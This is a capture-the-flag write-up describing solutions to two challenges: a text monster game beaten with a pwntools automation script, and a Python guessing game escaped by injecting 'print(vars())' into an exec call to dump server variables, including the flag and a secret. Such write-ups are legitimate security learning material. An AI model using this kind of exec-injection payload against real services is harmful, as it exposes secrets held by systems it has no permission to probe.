# Everland

    Description:
    In a darkened land, a hero must fight for their flag! Source
    running at everland.pwni.ng:7772
    
Everland was a textbased monster killing game. There were a few people looking at this and they figured out `fight` plus `2` or `Recouperate` will heal yourself by 10 and also do 10hp to the monster. I scripted this and then figured out Capturing an enemy at 0hp to Sacrifice to the final boss would lead to the flag. 

## Solution 
```python
#!/usr/env/python
from pwn import *

r = remote('everland.pwni.ng',7772)

r.sendline("chris")

for j in range(0, 10):
    print(r.recvline())
    r.sendline("forage")
    print(r.recvline())

for k in range(0, 4):
    print(r.recvline())
    r.sendline("use")
    print(r.recvline())
    r.sendline("0")
    print(r.recvline())


for i in range(0, 81):
    print(r.recvline())
    r.sendline("fight")
    print(r.recvline())
    r.sendline("2")
    print(r.recvline())

r.interactive()
```
This script gets you to the last turn with a normal enemy before making it to the boss. This is where I would use the rest of the items and then `fight` and `4` or `Capture` the enemy. You then move onto the boss and this is where you `fight` and `6` or `Sacrifice` and then you kill the Possessed monster and get the flag. The full log is in this repo. 

Flag: `PCTF{just_be_glad_i_didnt_arm_cpt_hook_with_GADTs}`


# can you guess me

    Description:
    Here's the source to a guessing game: here
    You can access the server at
    nc canyouguessme.pwni.ng 12349

Looking at the source we figured out we could input any set of characters that is less than or equal to 10. Not 10 total but 10 distinct characters. 
We chose `print(vars())` as it would print out all the variables, including flag. The set of `print(vas)` is exactly 10 and thus was valid. 

```


  ____         __   __           ____                     __  __
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|



Input value: print(vars())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f368183b9e8>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/guessme/can-you-guess-me.py', '__cached__': None, 'exit': <built-in function exit>, 'secret_value_for_password': 'not even a number; this is a damn string; and it has all 26 characters of the alphabet; abcdefghijklmnopqrstuvwxyz; lol', 'flag': 'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}', 'exec': <function exec at 0x7f3681784158>, 'val': 0, 'inp': 'print(vars())', 'count_digits': 10}
Nope. Better luck next time.
```

Flag: `PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}`

I played for my school's team this time instead of going it alone. IASG was in 3rd for a bit however we all got distracted by homework and didn't score past Friday night leaving us in 136th at the end.